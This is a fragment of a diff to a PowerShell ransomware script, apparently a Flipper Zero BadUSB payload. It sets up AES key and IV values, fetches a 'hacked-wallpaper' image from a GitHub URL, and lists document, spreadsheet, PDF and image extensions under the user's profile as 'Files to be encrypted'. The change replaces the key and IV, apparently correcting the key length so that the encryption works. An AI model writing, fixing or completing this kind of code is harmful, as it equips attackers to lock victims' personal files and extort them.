@@ -1,7 +1,7 @@
 # == Setup ==
 $root = $env:USERPROFILE
-$key = [Convert]::FromBase64String("c3VwZXJzZWNyZXRrZXlzZWNyZXRrZXlzZWNyZQ==")  
-$iv  = [Convert]::FromBase64String("aW5pdHZlY3Rvcg==")                          
+$key = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZgAxMjM0NTY3ODlhYmNkZWY=")  
+$iv  = [Convert]::FromBase64String("MDEyMzQ1Njc4OWFiY2RlZg==")                          
 $wallpaperUrl = "https://raw.githubusercontent.com/ninakisyova/flipperzero-badUSB/main/hacked-wallpaper.png"
 # == Files to be encrypted ==
 $includeExtensions = @("*.doc","*.docx","*.xls","*.xlsx","*.ppt","*.pptx","*.pdf","*.txt","*.jpg","*.png")
